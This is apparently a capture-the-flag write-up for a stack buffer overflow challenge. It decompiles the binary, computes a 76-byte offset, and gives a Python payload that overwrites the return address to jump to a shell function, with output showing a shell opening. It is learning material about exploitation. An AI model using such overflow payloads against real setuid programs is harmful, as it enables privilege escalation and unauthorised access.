### S0lv3d by H4yicl3

First i download source here :

then i use IDA to analysis the code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  __uid_t v4; // ST1C_4@3

  if ( argc == 2 )
  {
    v4 = geteuid();
    setresuid(v4, v4, v4);
    printf("shell function = %p\n", shell);			//We can know the address of shell here
    vuln((char *)argv[1]);							//vuln function
    result = 0;
  }
  else
  {
    puts("Usage: buffer_overflow [str]");
    result = 1;
  }
  return result;
}
```

the vuln() function
```c
int __cdecl vuln(char *src)
{
  char dest; // [sp+10h] [bp-48h]@1					//<------- overflow dest to modify return address

  strcpy(&dest, src);
  return dump_stack(&dest, 21, &src);
}
```

find the offset between dest and return
```
-00000048 dest            db ?
+00000004  r              db 4 dup(?)
.text:080485F8 shell           proc near               ; DATA XREF: main+4Co
```

offset = 0x48(dest) + 0x4(return) =0x4c = 76
and the address of shell is 0x080485F8
the python script to change v3 become 1 look like
```python
padding ="A"*76
padding +="\xf8\x85\x04\x08"
print padding
```

try run it
```
./overflow3 $(python overflow3.py)
shell function = 0x80485f8
Stack dump:
0xffac8440: 0xffac9800 (first argument)
0xffac843c: 0x080485f8 (saved eip)
0xffac8438: 0x41414141 (saved ebp)
0xffac8434: 0x41414141
0xffac8430: 0x41414141
0xffac842c: 0x41414141
0xffac8428: 0x41414141
0xffac8424: 0x41414141
0xffac8420: 0x41414141
0xffac841c: 0x41414141
0xffac8418: 0x41414141
0xffac8414: 0x41414141
0xffac8410: 0x41414141
0xffac840c: 0x41414141
0xffac8408: 0x41414141
0xffac8404: 0x41414141
0xffac8400: 0x41414141
0xffac83fc: 0x41414141
0xffac83f8: 0x41414141
0xffac83f4: 0x41414141
0xffac83f0: 0x41414141 (beginning of buffer)
$ whoami
hayicle
$ 
```

Well done!!